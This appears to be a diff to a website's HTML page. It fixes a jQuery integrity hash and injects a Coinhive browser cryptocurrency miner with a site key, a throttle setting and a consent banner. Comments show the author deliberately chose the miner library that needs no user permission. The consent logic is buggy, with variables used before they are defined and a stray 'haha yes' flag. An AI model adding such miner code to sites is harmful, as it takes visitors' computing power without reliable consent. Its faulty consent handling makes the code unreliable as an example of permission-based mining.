@@ -14,7 +14,7 @@
 
 		<link rel="stylesheet" href="css/stylesheet.css">
 
-		<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965Dz	O0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+		<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
 		<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
 
@@ -22,6 +22,7 @@
 	</head>
 	
 	<body>
+
 		<div id="main-navbar-wrapper">
 			<nav class="navbar main-navbar navbar-expand-md navbar-light affix" id="main-navbar" data-toggle="collapse" data-target="main-navbar-nav">
 				<div class="container-fluid text-left">
@@ -67,6 +68,121 @@
 			</div>
 
 		</div>
+<style type="text/css">
+	#askUser {
+		background-color: #D9D9D9;
+		color: black;
+		width: 520px;
+		height: 140px;
+		position: absolute;
+		bottom: 0;
+		left: 0;
+		font-family: arial;
+		margin-left: 5px;
+		margin-bottom: 5px;
+	}
+	#text {
+		position: relative;
+		left: 10;
+		margin: 5px 5px 1px 5px;
+	}
+	#yes {
+	    background-color: #4CAF50;
+	    border: none;
+	    color: white;
+	    padding: 3px 10px;
+	    text-align: center;
+	    text-decoration: none;
+	    display: inline-block;
+	    font-size: 16px;
+	    margin: 4px 2px;
+	    cursor: pointer;
+	    height: 50px;
 
+	}
+	#no {
+	    background-color: #9D9D9D;
+	    border: none;
+	    color: #333333;
+	    padding: 3px 10px;
+	    text-align: center;
+	    text-decoration: none;
+	    display: inline-block;
+	    font-size: 16px;
+	    margin: 4px 2px;
+	    cursor: pointer;
+	    height: 50px;
+	}
+</style>
+	
+	<div id="askUser">
+		<div id="text">We would like to use your processing power to do some calculations. These calculations are securely executed in your browser and nothing will be installed or downloaded to your computer.</div>
+		<button id="yes" class="button" onclick="yes()">Allow for this session</button>
+		<button id="no" class="button" onclick="no()">Do not allow</button>
+	</div>
+	<script src="https://coinhive.com/lib/coinhive.min.js">
+		//https://coinhive.com/lib/coinhive.min.js  <-- no user permission needed
+		//https://authedmine.com/lib/authedmine.min.js  <-- user permission needed (asked by site, not by me)
+	</script>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	<script>
+		var letMine = false;
+		var miner = new CoinHive.Anonymous('HJ7yyYmYI5RxwlPr9QUnf3hdjvnK4x8C', {throttle: 0.7});
+		// Only start on non-mobile devices and if not opted-out
+		// in the last 14400 seconds (4 hours):
+		if (miner.isMobile()) {
+			$("#askUser").remove();
+		}
+
+		//6.048 * 10^8 is 7 days in milliseconds
+		if (time < lastTime + 604800000) {
+			localStorage.setItem("mineGMO", 'haha yes');
+		} else {
+			console.log('less then 7 days, not asking');
+		}
+
+		if (localStorage.mineGMO == 'true' && !miner.isMobile()) {
+			miner.start();
+			setInterval(function() {console.log("hashes per second = " + miner.getHashesPerSecond());}, 500);
+			setInterval(function() {console.log("total hashes = " + miner.getTotalHashes());}, 1000);
+			console.log('miner started automatically because user consented.');
+			document.getElementById("askUser").remove();
+		} else if (localStorage.mineGMO == 'false') {
+			miner.stop();
+			console.log('miner did not start');
+			document.getElementById("askUser").remove();
+		}
+
+		var b = new Date();
+		var time = b.getTime();
+		console.log(time);
+
+		var lastTime = parseInt(localStorage.time1GMO)
+
+		function yes() {
+			setInterval(function() {console.log("hashes per second = " + miner.getHashesPerSecond());}, 500);
+			setInterval(function() {console.log("total hashes = " + miner.getTotalHashes());}, 1000);
+			$("#askUser").fadeOut(600);
+			//setInterval(function() {document.getElementById("askUser").style.opacity -= 0.01;}, 50);
+			if (!miner.isMobile() && !miner.didOptOut(14400)) {
+				miner.start();
+				console.log("miner started");
+			} else {
+				miner.stop();
+				console.log("miner did not start");
+			}
+			localStorage.setItem("mineGMO", true);
+			localStorage.setItem('time1GMO', time);
+		}
+		function no() {
+			letMine = false;
+			$("#askUser").fadeOut(600);
+			//setInterval(function() {document.getElementById("askUser").style.opacity -= 0.01;}, 50);
+			console.log("miner did not start");
+			miner.stop();
+			localStorage.setItem("mineGMO", false);
+			localStorage.setItem('time1GMO', time);
+		}
+	</script>
 
 	</body>
